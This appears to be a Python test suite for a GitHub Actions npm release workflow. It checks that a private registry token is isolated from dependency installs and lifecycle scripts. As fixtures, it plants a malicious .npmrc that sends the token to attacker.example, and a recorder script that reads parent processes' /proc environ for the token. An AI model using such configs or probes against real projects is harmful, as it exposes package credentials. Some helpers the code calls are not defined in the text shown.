#!/usr/bin/env python3
import base64
from collections import Counter
import hashlib
import http.server
import io
import json
import os
from pathlib import Path
import re
import shlex
import shutil
import subprocess
import tarfile
import tempfile
import threading
import urllib.request

import yaml


def run(command, *, cwd, env):
    result = subprocess.run(command, cwd=cwd, env=env, text=True, capture_output=True)
    if result.returncode != 0:
        raise AssertionError(
            f"command failed ({result.returncode}): {' '.join(command)}\n"
            f"{result.stdout}{result.stderr}"
        )
    return result.stdout


def write_package(directory, manifest, recorder):
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "package.json").write_text(json.dumps(manifest))
    (directory / "record-lifecycle.cjs").write_text(recorder)


def run_workflow_step(script, env):
    return subprocess.run(
        ["bash", "-c", script], text=True, capture_output=True, env=env,
    )


FAKE_REGISTRY = "https://npm.pkg.github.com"
FAKE_DOWNLOAD = f"{FAKE_REGISTRY}/download/@verjson/fixture/1.0.0/0123abcd"
FAKE_CONTENT = b"locked private package archive"


REPO_ROOT = Path(__file__).resolve().parent.parent
ACQUISITION_CONTRACT = ".verjson-npm-acquisition-contract"
ACQUISITION_SCRIPT = "scripts/npm-private-acquisition.sh"


def materialize_acquisition_contract(workspace):
    """Emulate the contract checkout that precedes the acquisition step."""
    destination = Path(workspace) / ACQUISITION_CONTRACT / ACQUISITION_SCRIPT
    destination.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(REPO_ROOT / ACQUISITION_SCRIPT, destination)


def resolve_step_env(step, runner_temp):
    """The step's YAML `env`, with the expressions Actions would substitute resolved."""
    resolved = {}
    for key, value in (step.get("env") or {}).items():
        text = str(value).replace("${{ runner.temp }}", str(runner_temp))
        text = text.replace("${{ secrets.NODE_AUTH_TOKEN }}", TOKEN)
        assert "${{" not in text, f"{step.get('name')}: unresolved expression in env {key}: {value}"
        resolved[key] = text
    return resolved


def leftover_acquisition_dirs(runner_temp):
    return list(runner_temp.glob("verjson-private-acquisition.*"))


def fake_npm_workspace(root, step, *, lock_packages=None, npm_version="11.19.1"):
    """A workspace whose npm is a recorder that caches FAKE_CONTENT on `cache add`."""
    runner_temp = root / "runner-temp"
    runner_temp.mkdir()
    wrapper_dir = root / "bin"
    wrapper_dir.mkdir()
    materialize_acquisition_contract(root)
    step_env = resolve_step_env(step, runner_temp)
    assert step_env.get("PRIVATE_PACKAGE_REGISTRY") == FAKE_REGISTRY, step_env
    cache_dir = Path(step_env.get("npm_config_cache", root / "unset-npm-cache"))
    digest = hashlib.sha512(FAKE_CONTENT).hexdigest()
    content = cache_dir / "_cacache/content-v2/sha512" / digest[:2] / digest[2:4] / digest[4:]
    wrapper = wrapper_dir / "npm"
    wrapper.write_text(
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        'if [[ -e "$GITHUB_WORKSPACE/.npmrc" || -L "$GITHUB_WORKSPACE/.npmrc" ]]; then config=present; else config=absent; fi\n'
        'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then token=present; else token=absent; fi\n'
        'printf "%s|%s|%s\\n" "$config" "$token" "$*" >>"$NPM_TRACE"\n'
        'case "$*" in\n'
        '  --version) printf "%s\\n" "$FAKE_NPM_VERSION" ;;\n'
        '  "cache add "*)\n'
        '    [[ "${NPM_EXIT_CODE:-0}" == 0 ]] || exit "$NPM_EXIT_CODE"\n'
        '    mkdir -p "$(dirname "$FAKE_CONTENT_PATH")"\n'
        '    printf %s "$FAKE_CONTENT_BYTES" >"$FAKE_CONTENT_PATH" ;;\n'
        "  *) exit 97 ;;\n"
        "esac\n"
    )
    wrapper.chmod(0o755)
    if lock_packages is None:
        lock_packages = {
            "": {"name": "fixture", "version": "1.0.0"},
            "node_modules/@verjson/fixture": {
                "version": "1.0.0",
                "resolved": FAKE_DOWNLOAD,
                "integrity": integrity_of(FAKE_CONTENT),
            },
        }
    (root / "package-lock.json").write_text(
        json.dumps({"name": "fixture", "lockfileVersion": 3, "packages": lock_packages})
    )
    inherited = {key: value for key, value in os.environ.items() if key.lower() != "npm_config_cache"}
    env = inherited | step_env | {
        "GITHUB_WORKSPACE": str(root),
        "RUNNER_TEMP": str(runner_temp),
        "NPM_TRACE": str(root / "npm-observation.log"),
        "PATH": f"{wrapper_dir}{os.pathsep}{os.environ['PATH']}",
        "FAKE_NPM_VERSION": npm_version,
        "FAKE_CONTENT_PATH": str(content),
        "FAKE_CONTENT_BYTES": FAKE_CONTENT.decode(),
        "NPM_EXIT_CODE": "0",
    }
    return env, runner_temp


def npm_trace_of(env):
    trace = Path(env["NPM_TRACE"])
    return trace.read_text(encoding="utf-8").splitlines() if trace.exists() else []


def verify_project_npmrc_isolation(step):
    script = step["run"]
    with tempfile.TemporaryDirectory(prefix="node-release-npmrc-isolation-") as temp:
        root = Path(temp)
        env, runner_temp = fake_npm_workspace(root, step)
        project_npmrc = root / ".npmrc"
        malicious_config = (
            "registry=https://attacker.example/\n"
            "//attacker.example/:_authToken=${NODE_AUTH_TOKEN}\n"
        )
        project_npmrc.write_text(malicious_config, encoding="utf-8")
        expected_trace = [
            "absent|present|--version",
            f"absent|present|cache add {FAKE_DOWNLOAD}",
        ]

        result = run_step(script, cwd=root, env=env)
        assert result.returncode == 0, result.stdout + result.stderr
        assert npm_trace_of(env) == expected_trace
        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
        assert not leftover_acquisition_dirs(runner_temp)

        Path(env["NPM_TRACE"]).unlink()
        env["NPM_EXIT_CODE"] = "23"
        materialize_acquisition_contract(root)
        result = run_step(script, cwd=root, env=env)
        assert result.returncode == 23, result.stdout + result.stderr
        assert npm_trace_of(env) == expected_trace
        assert project_npmrc.read_text(encoding="utf-8") == malicious_config
        assert not leftover_acquisition_dirs(runner_temp)

        Path(env["NPM_TRACE"]).unlink()
        project_npmrc.unlink()
        env["NPM_EXIT_CODE"] = "0"
        materialize_acquisition_contract(root)
        result = run_step(script, cwd=root, env=env)
        assert result.returncode == 0, result.stdout + result.stderr
        assert npm_trace_of(env) == expected_trace
        assert not project_npmrc.exists()


def private_lock(resolved, integrity=None):
    return {
        "": {"name": "fixture", "version": "1.0.0"},
        "node_modules/@verjson/fixture": {
            "version": "1.0.0",
            "resolved": resolved,
            "integrity": integrity_of(FAKE_CONTENT) if integrity is None else integrity,
        },
    }


def verify_private_download_selection(step):
    script = step["run"]
    # GitHub Packages records the owner's own spelling of the scope in download
    # URLs, such as @verJSON for the lowercase package @verjson/fixture.
    owner_spelling = f"{FAKE_REGISTRY}/download/@verJSON/fixture/1.0.0/0123abcd"
    with tempfile.TemporaryDirectory(prefix="node-release-owner-scope-") as temp:
        env, _ = fake_npm_workspace(Path(temp), step, lock_packages=private_lock(owner_spelling))
        result = run_step(script, cwd=temp, env=env)
        assert result.returncode == 0, result.stdout + result.stderr
        assert npm_trace_of(env)[-1] == f"absent|present|cache add {owner_spelling}"

    download = f"{FAKE_REGISTRY}/download/@verjson/fixture/1.0.0/0123abcd"
    sha1 = "sha1-" + base64.b64encode(hashlib.sha1(FAKE_CONTENT).digest()).decode()
    rejected_locks = {
        "query string": private_lock(f"{download}?x=1"),
        "fragment": private_lock(f"{download}#x"),
        "userinfo": private_lock(download.replace("https://", "https://user:secret@")),
        "explicit port": private_lock(download.replace(".com/", ".com:8443/")),
        "plain http": private_lock(download.replace("https://", "http://")),
        "non-canonical host": private_lock(download.replace("npm.pkg", "NPM.pkg")),
        "dot segment": private_lock(f"{FAKE_REGISTRY}/download/@verjson/../fixture/1.0.0/0123abcd"),
        "encoded slash": private_lock(f"{FAKE_REGISTRY}/download/@verjson%2ffixture/1.0.0/0123abcd/x"),
        "registry API path": private_lock(f"{FAKE_REGISTRY}/@verjson/fixture/-/fixture-1.0.0.tgz"),
        "extra segment": private_lock(f"{download}/extra"),
        "missing integrity": private_lock(download, integrity=""),
        "sha1 integrity": private_lock(download, integrity=sha1),
        "two integrities": private_lock(download, integrity=f"{integrity_of(FAKE_CONTENT)} {sha1}"),
        "truncated integrity": private_lock(download, integrity=integrity_of(FAKE_CONTENT)[:-4] + "=="),
        "conflicting integrity": private_lock(download) | {
            "node_modules/other/node_modules/@verjson/fixture": {
                "resolved": download,
                "integrity": integrity_of(b"different archive"),
            },
        },
    }
    for case, lock_packages in rejected_locks.items():
        with tempfile.TemporaryDirectory(prefix="node-release-rejected-lock-") as temp:
            env, runner_temp = fake_npm_workspace(Path(temp), step, lock_packages=lock_packages)
            result = run_step(script, cwd=temp, env=env)
            assert result.returncode != 0, f"{case}: accepted"
            assert "::error::" in result.stderr, f"{case}: {result.stdout}{result.stderr}"
            assert npm_trace_of(env) == [], f"{case}: npm ran with the credential"
            assert not leftover_acquisition_dirs(runner_temp), case

    public_v1 = {
        "lockfileVersion": 1,
        "dependencies": {
            "zod": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/zod/-/zod-1.0.0.tgz"},
        },
    }
    with tempfile.TemporaryDirectory(prefix="node-release-public-v1-") as temp:
        env, _ = fake_npm_workspace(Path(temp), step)
        Path(temp, "package-lock.json").write_text(json.dumps(public_v1))
        result = run_step(script, cwd=temp, env=env)
        assert result.returncode == 0, "a v1 lockfile without private packages needs no credential"
        assert npm_trace_of(env) == [], "npm must not receive the credential without private downloads"

    private_v1 = {
        "lockfileVersion": 1,
        "dependencies": {
            "@verjson/fixture": {"version": "1.0.0", "resolved": FAKE_DOWNLOAD},
        },
    }
    for case, lockfile in {
        "missing lockfile": None,
        "v1 lockfile with a private package": private_v1,
        "v1 lockfile naming the registry in a nested key": {
            "lockfileVersion": 1,
            "dependencies": {"a": {"dependencies": {"HTTPS://NPM.PKG.GITHUB.COM/x": {}}}},
        },
        "no packages map": {"lockfileVersion": 3},
        "invalid JSON": "{",
    }.items():
        with tempfile.TemporaryDirectory(prefix="node-release-invalid-lockfile-") as temp:
            env, _ = fake_npm_workspace(Path(temp), step)
            lock_path = Path(temp, "package-lock.json")
            if lockfile is None:
                lock_path.unlink()
            else:
                lock_path.write_text(lockfile if isinstance(lockfile, str) else json.dumps(lockfile))
            result = run_step(script, cwd=temp, env=env)
            assert result.returncode != 0 and "::error::" in result.stderr, case
            assert npm_trace_of(env) == [], case

    public_only = {
        "": {"name": "fixture", "version": "1.0.0"},
        "node_modules/zod": {
            "resolved": "https://registry.npmjs.org/zod/-/zod-1.0.0.tgz",
            "integrity": integrity_of(b"zod"),
        },
        "node_modules/git-dependency": {"resolved": "git+https://github.com/verjson/x.git#0123abcd"},
        "node_modules/linked": {"resolved": "linked", "link": True},
        "node_modules/tarball": {"resolved": "file:vendor/tarball.tgz"},
        "node_modules/bundled": {"inBundle": True},
    }
    with tempfile.TemporaryDirectory(prefix="node-release-public-only-") as temp:
        env, _ = fake_npm_workspace(Path(temp), step, lock_packages=public_only)
        result = run_step(script, cwd=temp, env=env)
        assert result.returncode == 0, result.stdout + result.stderr
        assert npm_trace_of(env) == [], "npm must not receive the credential without private downloads"

    with tempfile.TemporaryDirectory(prefix="node-release-shrinkwrap-") as temp:
        env, _ = fake_npm_workspace(Path(temp), step, lock_packages=private_lock(f"{download}?stale=1"))
        Path(temp, "npm-shrinkwrap.json").write_text(
            json.dumps({"lockfileVersion": 3, "packages": private_lock(download)})
        )
        result = run_step(script, cwd=temp, env=env)
        assert result.returncode == 0, "npm ci prefers npm-shrinkwrap.json; so must acquisition"
        assert npm_trace_of(env)[-1] == f"absent|present|cache add {download}"

    for case, overrides in {
        "tampered content": {"FAKE_CONTENT_BYTES": "tampered archive"},
        "content outside the cache": {"FAKE_CONTENT_PATH": "/dev/null/never"},
    }.items():
        with tempfile.TemporaryDirectory(prefix="node-release-cache-content-") as temp:
            env, _ = fake_npm_workspace(Path(temp), step)
            if case == "content outside the cache":
                overrides = {"FAKE_CONTENT_PATH": str(Path(temp, "elsewhere/content"))}
            result = run_step(script, cwd=temp, env=env | overrides)
            assert result.returncode != 0, f"{case}: accepted"
            assert "did not cache the exact locked content" in result.stdout, case
    with tempfile.TemporaryDirectory(prefix="node-release-cache-symlink-") as temp:
        env, _ = fake_npm_workspace(Path(temp), step)
        real = Path(temp, "real-content")
        env["FAKE_CONTENT_PATH"] = str(real)
        content = Path(temp, "npm-cache/_cacache/content-v2/sha512")
        digest = hashlib.sha512(FAKE_CONTENT).hexdigest()
        link = content / digest[:2] / digest[2:4] / digest[4:]
        link.parent.mkdir(parents=True)
        link.symlink_to(real)
        result = run_step(script, cwd=temp, env=env)
        assert result.returncode != 0 and "did not cache the exact locked content" in result.stdout


def verify_explicit_cache_path(step):
    script = step["run"]
    for case, cache in {"unset": None, "relative": "verjson-npm-cache", "empty": ""}.items():
        with tempfile.TemporaryDirectory(prefix="node-release-cache-path-") as temp:
            env, runner_temp = fake_npm_workspace(Path(temp), step)
            env.pop("npm_config_cache", None)
            if cache is not None:
                env["npm_config_cache"] = cache
            result = run_step(script, cwd=temp, env=env)
            assert result.returncode != 0, f"{case} cache path: accepted"
            assert "npm_config_cache must be the absolute cache path" in result.stdout, case
            assert not any("|cache add " in line for line in npm_trace_of(env)), case
            assert not leftover_acquisition_dirs(runner_temp), case


def verify_npm_major_gate(step):
    script = step["run"]
    def outcome(npm_version):
        with tempfile.TemporaryDirectory(prefix="node-release-npm-gate-") as temp:
            env, _ = fake_npm_workspace(Path(temp), step, npm_version=npm_version)
            result = run_step(script, cwd=temp, env=env)
            added = any("|cache add " in line for line in npm_trace_of(env))
            assert added == (result.returncode == 0), (npm_version, result.stdout)
            if result.returncode != 0:
                assert "has no verified credential-isolation contract" in result.stdout
            return result.returncode == 0

    accepted = {major for major in range(1, 21) if outcome(f"{major}.4.2")}
    assert accepted == set(SUPPORTED_NPM_RELEASES), (
        f"the workflow gives the credential to npm majors {sorted(accepted)}, but the test "
        f"verifies isolation under {sorted(SUPPORTED_NPM_RELEASES)}"
    )
    for malformed in ("10", "11.0.0-pre.1", "v11.0.0", "11.0.0\n12.0.0", "110.0.0", ""):
        assert not outcome(malformed), malformed


def verify_npm_cache_policy(script):
    cases = (
        ("true", "true", "true", "false", True),
        ("true", "false", "true", "true", False),
        ("false", "false", "true", "false", False),
        ("true", "false", "false", "false", False),
    )
    for requested, private_token, lockfile, expected, report_disabled in cases:
        with tempfile.TemporaryDirectory(prefix="node-release-cache-policy-") as temp:
            root = Path(temp)
            output = root / "output"
            summary = root / "summary"
            env = os.environ.copy()
            env.update({
                "CACHE_REQUESTED": requested,
                "HAS_PRIVATE_PACKAGE_TOKEN": private_token,
                "LOCKFILE_MATCHED": lockfile,
                "GITHUB_OUTPUT": str(output),
                "GITHUB_STEP_SUMMARY": str(summary),
            })
            result = run_workflow_step(script, env)
            assert result.returncode == 0, result.stderr
            assert output.read_text(encoding="utf-8").splitlines() == [
                f"enabled={expected}",
            ]
            summary_text = summary.read_text(encoding="utf-8") if summary.exists() else ""
            assert ("private package credentials were supplied" in summary_text) == report_disabled


def verify_cache_namespace(prepare_steps):
    marker_step = next(
        step for step in prepare_steps if step.get("id") == "npm-cache-namespace"
    )
    setup_index = next(
        index for index, step in enumerate(prepare_steps)
        if str(step.get("uses", "")).startswith("actions/setup-node@")
    )
    marker_index = prepare_steps.index(marker_step)
    cleanup_step = next(
        step for step in prepare_steps
        if step.get("name") == "Remove npm cache namespace marker"
    )
    cleanup_index = prepare_steps.index(cleanup_step)
    marker_path = ".verjson-node-release-cache-namespace-v2"
    assert marker_step.get("if") == "steps.npm-cache-policy.outputs.enabled == 'true'"
    assert cleanup_step.get("if") == (
        "always() && steps.npm-cache-namespace.outputs.created == 'true'"
    )
    assert marker_index < setup_index < cleanup_index
    setup_step = prepare_steps[setup_index]
    assert setup_step["with"]["cache-dependency-path"].splitlines() == [
        "${{ inputs.cache-dependency-path }}",
        marker_path,
    ]

    with tempfile.TemporaryDirectory(prefix="node-release-cache-namespace-") as temp:
        workspace = Path(temp)
        output = workspace / "github-output"
        env = os.environ.copy()
        env.update({"GITHUB_WORKSPACE": str(workspace), "GITHUB_OUTPUT": str(output)})
        marker = workspace / marker_path
        assert not marker.exists()
        result = run_workflow_step(marker_step["run"], env)
        assert result.returncode == 0, result.stderr
        assert marker.read_text(encoding="utf-8") == "verjson-node-release-cache-v2\n"
        assert output.read_text(encoding="utf-8").splitlines() == ["created=true"]
        result = run_workflow_step(cleanup_step["run"], env)
        assert result.returncode == 0, result.stderr
        assert not marker.exists()

        marker.write_text("consumer-owned content\n", encoding="utf-8")
        result = run_workflow_step(marker_step["run"], env)
        assert result.returncode != 0
        assert marker.read_text(encoding="utf-8") == "consumer-owned content\n"

        marker.unlink()
        output.unlink()
        output.mkdir()
        result = run_workflow_step(marker_step["run"], env)
        assert result.returncode != 0
        assert not marker.exists(), "failed marker creation must clean up its partial file"


def main():
    repo_root = Path(__file__).resolve().parent.parent
    workflow = (repo_root / ".github/workflows/node-release.yml").read_text()
    workflow_document = yaml.safe_load(workflow)
    prepare_job = workflow_document["jobs"]["prepare"]
    assert prepare_job.get("env") == {"NODE_AUTH_TOKEN": ""}, (
        "the preparation job must mask runner-inherited package credentials"
    )
    assert prepare_job["runs-on"] == "ubuntu-24.04", (
        "preparation must use a fresh GitHub-hosted runner"
    )
    runner_guard_names = {
        "prepare": "Require a fresh GitHub-hosted preparation runner",
        "release": "Require a fresh GitHub-hosted publication runner",
        "retention": "Require a fresh GitHub-hosted retention runner",
    }
    runner_guard_commands = {}
    for job_name, expected_name in runner_guard_names.items():
        runner_guard = workflow_document["jobs"][job_name]["steps"][0]
        assert runner_guard.get("name") == expected_name
        assert runner_guard.get("env") == {"RUNNER_ENVIRONMENT": "${{ runner.environment }}"}
        runner_guard_command = runner_guard.get("run")
        assert isinstance(runner_guard_command, str)
        assert '"$RUNNER_ENVIRONMENT" != "github-hosted"' in runner_guard_command
        runner_guard_commands[job_name] = runner_guard_command
    acquisition_step = next(
        step for step in prepare_job["steps"] if step.get("name") == ACQUISITION_STEP
    )
    install_step = next(
        step for step in prepare_job["steps"] if step.get("name") == TOKENLESS_INSTALL_STEP
    )
    setup_node_step = next(
        step for step in prepare_job["steps"]
        if str(step.get("uses", "")).startswith("actions/setup-node@")
    )
    shared_cache = "${{ runner.temp }}/verjson-npm-cache"
    assert acquisition_step.get("env") == {
        "NODE_AUTH_TOKEN": "${{ secrets.NODE_AUTH_TOKEN }}",
        "PRIVATE_PACKAGE_REGISTRY": setup_node_step["with"]["registry-url"],
        "npm_config_cache": shared_cache,
    }
    assert setup_node_step["with"]["registry-url"] == "https://npm.pkg.github.com"
    assert install_step.get("run", "").strip() == "npm ci --prefer-offline"
    assert install_step.get("env") == {"npm_config_cache": shared_cache}, (
        "the dependency install must receive no credential and share the acquisition cache"
    )
    for step in (acquisition_step, install_step):
        assert "shell" not in step, "run_step reproduces the default `bash -e` shell only"
    steps = prepare_job["steps"]
    secret_steps = [
        step.get("name") for step in steps if SECRETS_EXPRESSION.search(json.dumps(step))
    ]
    assert secret_steps == [CACHE_POLICY_STEP, ACQUISITION_STEP], (
        f"only the acquisition step may receive a secret; found secret expressions in {secret_steps}"
    )
    assert steps.index(acquisition_step) + 1 == steps.index(install_step)
    acquisition_index = steps.index(acquisition_step)
    contract_ref_guard, symlink_refusal, contract_checkout = steps[acquisition_index - 3:acquisition_index]
    assert contract_ref_guard.get("env") == {"CONTRACT_REF": "${{ inputs.contract-ref }}"}
    assert contract_ref_guard.get("run") == '[[ "$CONTRACT_REF" =~ ^[0123456789abcdef]{40}$ ]]'
    # ADR 0236; scripts/ci-gate/fixed-path-checkout-refusal.test.py executes it.
    assert symlink_refusal.get("name") == f"Refuse a symlink at the {ACQUISITION_CONTRACT} checkout path"
    assert str(contract_checkout.get("uses", "")).startswith("actions/checkout@")
    assert contract_checkout.get("with") == {
        "repository": "Verjson/.github",
        "ref": "${{ inputs.contract-ref }}",
        "path": ACQUISITION_CONTRACT,
        "persist-credentials": False,
    }, "acquisition must run the contract's script from the immutable contract commit"
    assert acquisition_step["run"] == (
        f"bash {ACQUISITION_CONTRACT}/{ACQUISITION_SCRIPT}\nrm -rf {ACQUISITION_CONTRACT}\n"
    ), "the credentialed step must run only the shared acquisition and remove its checkout"
    verify_secret_expression_matcher()
    verify_project_npmrc_isolation(acquisition_step)
    verify_private_download_selection(acquisition_step)
    verify_explicit_cache_path(acquisition_step)
    verify_npm_major_gate(acquisition_step)
    cache_policy_step = next(
        step for step in prepare_job["steps"] if step.get("id") == "npm-cache-policy"
    )
    assert cache_policy_step.get("name") == CACHE_POLICY_STEP
    assert "secrets" not in cache_policy_step["run"].lower()
    assert cache_policy_step.get("env") == {
        "CACHE_REQUESTED": "${{ inputs.cache }}",
        "HAS_PRIVATE_PACKAGE_TOKEN": "${{ secrets.NODE_AUTH_TOKEN != '' }}",
        "LOCKFILE_MATCHED": "${{ hashFiles(inputs.cache-dependency-path) != '' }}",
    }
    verify_npm_cache_policy(cache_policy_step["run"])
    verify_cache_namespace(prepare_job["steps"])

    runner_guards_reject_self_hosted(runner_guard_commands)
    verified_majors = set()
    for major, (version, integrity) in sorted(SUPPORTED_NPM_RELEASES.items()):
        with tempfile.TemporaryDirectory(prefix=f"node-release-npm{major}-") as temp:
            root = Path(temp)
            npm_bin = provision_npm(version, integrity, root / "npm")
            verify_dependency_code_never_sees_credential(
                npm_bin, version, acquisition_step, install_step, root,
            )
            verify_empty_dependency_tree(
                npm_bin, version, acquisition_step, install_step, root,
            )
        verified_majors.add(int(version.split(".", 1)[0]))
    assert verified_majors == set(SUPPORTED_NPM_RELEASES), (
        f"isolation was exercised under npm majors {sorted(verified_majors)}, "
        f"not every major the workflow accepts: {sorted(SUPPORTED_NPM_RELEASES)}"
    )


ACQUISITION_STEP = "Acquire private registry packages with credentials"
TOKENLESS_INSTALL_STEP = "Install dependencies without credentials"
CACHE_POLICY_STEP = "Decide whether npm download caching is safe"
TOKEN = "synthetic-package-token"
# Any Actions expression that reads the secrets context, in any spelling.
SECRETS_EXPRESSION = re.compile(
    r"\$\{\{(?:(?!\}\}).)*(?<![\w.-])secrets(?![\w-])", re.IGNORECASE | re.DOTALL,
)


def verify_secret_expression_matcher():
    for spelling in (
        "${{ secrets.NODE_AUTH_TOKEN }}",
        "${{secrets.NODE_AUTH_TOKEN}}",
        "${{  Secrets.node_auth_token  }}",
        "${{ secrets['NODE_AUTH_TOKEN'] }}",
        "${{ format('{0}', secrets.NODE_AUTH_TOKEN) }}",
        "${{ toJSON(secrets) }}",
    ):
        assert SECRETS_EXPRESSION.search(json.dumps({"env": {"X": spelling}})), spelling
    for unrelated in ("${{ runner.temp }}", "secrets.NODE_AUTH_TOKEN", "${{ inputs.secrets-file }}x"):
        assert not SECRETS_EXPRESSION.search(json.dumps({"env": {"X": unrelated}})), unrelated

# One exact npm per major that a Node line node-release accepts bundles: Node
# 18, 20, and 22 ship npm 10 and Node 24, 25, and 26 ship npm 11. 10.9.9 is the
# Node 22 npm on hosted ubuntu-24.04 where #1827 exposed the credential, and
# 11.19.1 is the npm of node-release's default Node 24. Pinning the npm under
# test, instead of using the runner's, keeps the verdict runner-independent.
SUPPORTED_NPM_RELEASES = {
    10: (
        "10.9.9",
        "sha512-1g+6jLQvaIuB4zwvHL7yrXuXcWZwDsCtBX8bbWDqbvJSSr9nPiDDWTHNgwXR27iIcTTW7v3A57hDW9RYv2W4Yg==",
    ),
    11: (
        "11.19.1",
        "sha512-ztsxKxt/kkIaAs+2i0GU6I+DRmUdrNasxTZKJe9TCdSjKxlhah/4r/hl5ygMD6XAg1qZ9c2TNomR4qgOydp10g==",
    ),
}

# The recorder assembles the token at run time: a literal copy in its source
# would make every installed dependency tree contain the credential.
LIFECYCLE_RECORDER = (
    "const fs = require('node:fs');\n"
    "const needle = ['synthetic', 'package', 'token'].join('-');\n"
    "const token = process.env.NODE_AUTH_TOKEN || '<unset>';\n"
    "const tokenEnvKeys = Object.entries(process.env)\n"
    "  .filter(([, value]) => typeof value === 'string' && value.includes(needle))\n"
    "  .map(([key]) => key);\n"
    "const tokenAncestorPids = [];\n"
    "let parentPid = process.ppid;\n"
    "while (parentPid > 1) {\n"
    "  let parentEnvironment;\n"
    "  let parentStatus;\n"
    "  try {\n"
    "    parentEnvironment = fs.readFileSync(`/proc/${parentPid}/environ`, 'utf8').split('\\0');\n"
    "    parentStatus = fs.readFileSync(`/proc/${parentPid}/status`, 'utf8');\n"
    "  } catch { break; }\n"
    "  if (parentEnvironment.includes(`NODE_AUTH_TOKEN=${needle}`)) tokenAncestorPids.push(parentPid);\n"
    "  const parentPidMatch = parentStatus.match(/^PPid:\\s*(\\d+)/m);\n"
    "  if (!parentPidMatch) break;\n"
    "  parentPid = Number(parentPidMatch[1]);\n"
    "}\n"
    "fs.appendFileSync(process.env.LIFECYCLE_LOG, "
    "`${process.env.npm_package_name}:${process.argv[2]}:${token}:${JSON.stringify(tokenEnvKeys)}:${JSON.stringify(tokenAncestorPids)}\\n`);\n"
)
ROOT_SCRIPTS = {
    hook: f"node record-lifecycle.cjs root-{hook}"
    for hook in (
        "preinstall",
        "install",
        "postinstall",
        "prepublish",
        "preprepare",
        "prepare",
        "postprepare",
        "dependencies",
    )
}
DEPENDENCY_SCRIPTS = {
    hook: f"node record-lifecycle.cjs dependency-{hook}"
    for hook in ("preinstall", "install", "postinstall", "prepare")
}


def runner_guards_reject_self_hosted(runner_guard_commands):
    with tempfile.TemporaryDirectory(prefix="node-release-runner-guard-") as temp:
        for job_name, runner_guard_command in runner_guard_commands.items():
            hosted = subprocess.run(
                ["bash", "-c", runner_guard_command],
                cwd=temp,
                env=os.environ | {"RUNNER_ENVIRONMENT": "github-hosted"},
                text=True,
                capture_output=True,
            )
            assert hosted.returncode == 0, f"{job_name}: {hosted.stderr}"
            self_hosted = subprocess.run(
                ["bash", "-c", runner_guard_command],
                cwd=temp,
                env=os.environ | {"RUNNER_ENVIRONMENT": "self-hosted"},
                text=True,
                capture_output=True,
            )
            assert self_hosted.returncode != 0, f"{job_name}: runner guard accepted self-hosted"
            assert "requires a fresh GitHub-hosted runner" in self_hosted.stdout


def provision_npm(version, integrity, destination):
    """Install one exact, integrity-checked npm release and return its bin directory."""
    url = f"https://registry.npmjs.org/npm/-/npm-{version}.tgz"
    with urllib.request.urlopen(url, timeout=120) as response:
        archive = response.read()
    digest = "sha512-" + base64.b64encode(hashlib.sha512(archive).digest()).decode()
    assert digest == integrity, f"npm {version} archive does not match its pinned integrity"
    destination.mkdir(parents=True)
    with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tar:
        tar.extractall(destination, filter="data")
    bin_dir = destination / "bin"
    bin_dir.mkdir()
    npm = bin_dir / "npm"
    npm.write_text(
        "#!/usr/bin/env bash\n"
        f"exec node {shlex.quote(str(destination / 'package/bin/npm-cli.js'))} \"$@\"\n"
    )
    npm.chmod(0o755)
    reported = subprocess.run(
        [str(npm), "--version"], text=True, capture_output=True, check=True,
    ).stdout.strip()
    assert reported == version, f"provisioned npm reports {reported}, expected {version}"
    return bin_dir


def package_tarball(manifest, files):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, content in {"package.json": json.dumps(manifest), **files}.items():
            data = content.encode()
            info = tarfile.TarInfo(f"package/{name}")
            info.size = len(data)
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def integrity_of(data):
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


class FixtureRegistry:
    """A local registry that records every request and its Authorization header."""

    def __init__(self, *, require_token):
        self.routes = {}
        self.requests = []
        registry = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                authorization = self.headers.get("Authorization")
                registry.requests.append((self.path, authorization))
                if require_token and authorization != f"Bearer {TOKEN}":
                    self.send_response(401)
                    self.end_headers()
                    return
                body = registry.routes.get(self.path)
                if body is None:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.origin = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def publish(self, manifest, tarball, tarball_path):
        name, version = manifest["name"], manifest["version"]
        self.routes[tarball_path] = tarball
        packument = json.dumps({
            "name": name,
            "dist-tags": {"latest": version},
            "versions": {
                version: {
                    **manifest,
                    "dist": {
                        "tarball": f"{self.origin}{tarball_path}",
                        "integrity": integrity_of(tarball),
                    },
                },
            },
        }).encode()
        encoded = name.replace("/", "%2f")
        for path in {f"/{name}", f"/{encoded}", f"/{name.replace('/', '%2F')}"}:
            self.routes[path] = packument

    def close(self):
        self.server.shutdown()
        self.server.server_close()


def npm_environment(root, npm_bin, private_registry, label):
    user_config = root / f"{label}-user.npmrc"
    global_config = root / f"{label}-global.npmrc"
    # Mirrors the user config actions/setup-node writes for registry-url + scope.
    # It leaves the default registry alone, as setup-node does: npm exports a
    # non-default registry to child processes, where it would outrank a git
    # dependency's own .npmrc and hide that dependency's exfiltration path.
    user_config.write_text(
        f"@fixture:registry={private_registry.origin}/\n"
        f"//{private_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
    )
    global_config.write_text("")
    return os.environ | {
        "PATH": f"{npm_bin}{os.pathsep}{os.environ['PATH']}",
        "NPM_CONFIG_USERCONFIG": str(user_config),
        "NPM_CONFIG_GLOBALCONFIG": str(global_config),
        "npm_config_cache": str(root / f"{label}-npm-cache"),
        "npm_config_fetch_retries": "0",
        "npm_config_audit": "false",
        "npm_config_fund": "false",
        "npm_config_update_notifier": "false",
        "GIT_CONFIG_NOSYSTEM": "1",
        "LIFECYCLE_LOG": str(root / f"{label}-lifecycle.log"),
    }


